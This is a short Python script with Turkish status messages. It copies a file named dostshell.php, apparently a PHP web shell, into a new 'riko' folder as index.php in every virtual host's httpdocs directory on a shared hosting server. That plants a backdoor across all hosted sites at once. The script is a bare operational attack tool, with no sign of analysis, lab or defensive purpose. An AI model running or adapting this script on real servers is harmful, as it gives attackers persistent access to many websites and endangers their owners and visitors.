import glob
import os
import shutil

source_file = '/var/www/vhosts/dostshell.php'

for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
    try:
        new_folder = os.path.join(target_dir, 'riko')
        
        if not os.path.exists(new_folder):
            os.makedirs(new_folder)
        
        new_file_path = os.path.join(new_folder, 'index.php')
        
        shutil.copy(source_file, new_file_path)
        
        print("{}, {} olarak kopyalandi.".format(source_file, new_file_path))
    
    except Exception as e:
        print("Hata: {} icinde dosya olusturulamadi. {}".format(target_dir, e))
